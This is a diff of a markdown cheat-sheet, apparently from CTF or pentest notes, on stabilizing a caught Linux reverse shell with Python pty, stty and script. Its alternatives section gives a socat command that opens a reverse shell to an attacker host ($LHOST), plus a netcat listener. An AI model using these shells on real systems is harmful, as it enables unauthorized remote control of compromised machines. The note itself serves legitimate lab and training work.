@@ -1,30 +1,69 @@
 # Python PTY Shell Stabilization
 
-Quick upgrade for a basic Linux reverse shell into an interactive TTY-like session.
+When you catch a reverse shell using Netcat (e.g. from bash, php, or netcat payloads), the shell is often non-interactive (a "dumb" shell). This means no auto-complete (tab), no history (up arrow), and pressing `Ctrl+C` will kill the shell and lose the connection.
 
-Used on: **bsidesgtthompson**, **blog**, **coldvvars**
+This sequence upgrades the dumb shell to a fully interactive TTY.
 
-## Commands
+## The Sequence
 
-Stabilise:
+**1. Spawn a PTY (Inside the dumb shell)**
+
 ```bash
-# What it does: spawn an interactive bash shell using Python.
+# Try python3 first
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
-# Ctrl+Z
-stty raw -echo; fg
-reset
+
+# If python3 is not found, try python
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-Optional terminal-side cleanup when the shell supports it:
+**2. Background the shell (On your attacker machine)**
+
+Press `Ctrl+Z` to background the netcat listener. You will drop back to your local terminal.
+
+**3. Configure your local terminal to send raw keystrokes (Attacker machine)**
+
+```bash
+stty raw -echo; fg
+```
+
+*(Note: after typing this, you won't see your keystrokes. Hit Enter. You might see `nc -lvnp 4444`. Hit Enter again to get the target's prompt back).*
+
+**4. Set environment variables (Inside the stabilized shell)**
 
 ```bash
 export TERM=xterm
-stty rows 44 cols 102
+export SHELL=bash
 ```
 
-## Notes
+**5. (Optional) Fix terminal dimensions**
 
-- Use this immediately after catching a raw reverse shell if `su`, `sudo`, editors, or job control behave badly.
-- Preserve any machine-specific dimensions from the writeup when they were actually used.
+If you run `nano` or `clear` and the screen breaks, your terminal dimensions are mismatched.
 
+```bash
+# On your local machine (open a new tab):
+stty size
+# Output: 40 130 (rows columns)
+
+# Inside the stabilized target shell:
+stty rows 40 cols 130
+```
+
+## Alternatives to Python
+
+If Python is not installed on the target, try:
+
+### Script
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+# Then proceed with Ctrl+Z -> stty raw -echo; fg
+```
+
+### Socat
+Upload `socat` to the target.
+```bash
+# Attacker listener
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# Target execution
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
+```
